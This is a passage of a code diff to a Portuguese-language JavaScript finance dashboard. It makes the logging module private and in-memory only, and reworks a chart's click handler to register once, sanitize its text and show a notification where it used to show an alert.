+                _logs.shift();
+            }
+            // ✅ Sem localStorage — logs apenas em memória
+        },
 
-    obter() {
-        return [...this.logs];
-    },
+        // ✅ obter() mantido internamente para uso pelos módulos do próprio sistema
+        //    mas NÃO exposto em window.*
+        obter() {
+            return [..._logs];
+        },
 
-    limpar() {
-        this.logs = [];
-        // Sem localStorage para limpar
-    }
-};
+        limpar() {
+            _logs.length = 0;
+        },
+    };
+})();
 
-// Sem carregamento de localStorage — logs sempre começam zerados
-window.sistemaLog = sistemaLog;
 
 // ========== INICIALIZAÇÃO FINAL ==========
 
@@ -8002,22 +8285,27 @@ function desenharGraficoLinha() {
     });
     
     canvas._points = points;
-    
-    canvas.onclick = function(ev) {
-        const rect = canvas.getBoundingClientRect();
-        const mx = ev.clientX - rect.left;
-        const my = ev.clientY - rect.top;
-        
-        const ponto = (canvas._points || []).find(p => {
-            const dx = p.x - mx;
-            const dy = p.y - my;
-            return Math.sqrt(dx*dx + dy*dy) <= 8;
+
+    if (!canvas._clickListenerRegistrado) {
+        canvas._clickListenerRegistrado = true;
+        canvas.addEventListener('click', function(ev) {
+            const rect = canvas.getBoundingClientRect();
+            const mx = ev.clientX - rect.left;
+            const my = ev.clientY - rect.top;
+
+            const ponto = (canvas._points || []).find(p => {
+                const dx = p.x - mx, dy = p.y - my;
+                return Math.sqrt(dx * dx + dy * dy) <= 8;
+            });
+
+            if (ponto) {
+                mostrarNotificacao(
+                    `${_sanitizeText(ponto.mes)}: ${formatBRL(ponto.saldo)}`,
+                    'info'
+                );
+            }
         });
-        
-        if(ponto) {
-            alert(`Mês: ${ponto.mes}\nSaldo: ${formatBRL(ponto.saldo)}`);
-        }
-    };
+    }
 }
 
 function desenharTopGastos(dados, label) {
